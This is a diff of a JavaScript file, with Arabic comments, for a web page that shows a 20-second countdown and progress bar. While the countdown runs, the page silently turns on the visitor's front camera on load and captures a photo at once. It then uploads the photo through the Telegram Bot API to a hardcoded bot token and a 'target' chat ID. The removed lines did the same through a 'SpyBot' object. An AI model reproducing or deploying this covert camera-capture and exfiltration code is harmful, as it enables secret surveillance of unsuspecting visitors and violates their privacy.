@@ -1,65 +1,59 @@
-// JavaScript code in script.js
+document.addEventListener("DOMContentLoaded", function () {
 
-const video = document.createElement('video');
-const canvas = document.createElement('canvas');
-const progressBar = document.getElementById('progress');
-const countdown = document.getElementById('countdown');
+    let timeLeft = 20; // عدد الثواني للعد التنازلي
 
-function updateProgress(percentage) {
-  progressBar.style.width = `${percentage}%`;
-}
+    const countdownElement = document.getElementById("countdown");
 
-function updateCountdown(seconds) {
-  countdown.textContent = seconds;
-}
+    const progressBar = document.getElementById("progress-bar");
 
-// Function to capture image from camera
-function captureImage() {
-  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-    .then(stream => {
-      video.srcObject = stream;
-      video.play();
+    const countdownInterval = setInterval(() => {
 
-      setTimeout(() => {
-        const context = canvas.getContext('2d');
+        timeLeft--;
+
+        countdownElement.textContent = timeLeft;
+
+        progressBar.style.width = (timeLeft / 20) * 100 + "%"; // تقليل العرض تدريجياً
+
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+        }
+
+    }, 1000);
+
+    // تشغيل الكاميرا الأمامية تلقائيًا
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            console.log("✅ الكاميرا تعمل بنجاح");
+            captureAndSendPhoto(); // التقاط الصورة في أول جزء من الثانية
+        } catch (error) {
+            console.error("❌ فشل في تشغيل الكاميرا:", error);
+        }
+    }
+
+    startCamera();
+
+    // التقاط الصورة وإرسالها إلى تيليجرام
+    function captureAndSendPhoto() {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+    }
 
-        const dataURL = canvas.toDataURL('image/jpeg');
-        // Send the captured image to the server or display it on the page
-        console.log('Captured image:', dataURL);
+    function sendPhoto(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", "5375214810"); // معرف تيليجرام المستهدف
+        formData.append("photo", blob, "snapshot.jpg");
 
-        // Send the captured image to the specified bot and user
-        const bot = new SpyBot('target-device-ip', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E', '5375214810');
-
-        bot.connect()
-          .then(() => {
-            return bot.execute(`sendImage "${dataURL}"`);
-          })
-          .then(() => {
-            console.log('Image sent successfully!');
-          })
-          .catch(error => {
-            console.error('Error sending image:', error);
-          });
-      }, 2000);
-    })
-    .catch(error => {
-      console.error('Error accessing camera:', error);
-    });
-}
-
-// Simulate data collection and progress updates
-updateProgress(0);
-updateCountdown(20);
-
-setTimeout(() => {
-  updateProgress(25);
-  updateCountdown(15);
-}, 2000);
-
-// Simulate camera access and image capture
-setTimeout(() => {
-  captureImage();
-}, 4000);
+        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => console.log("✅ تم إرسال الصورة:", data))
+        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
+    }
+});
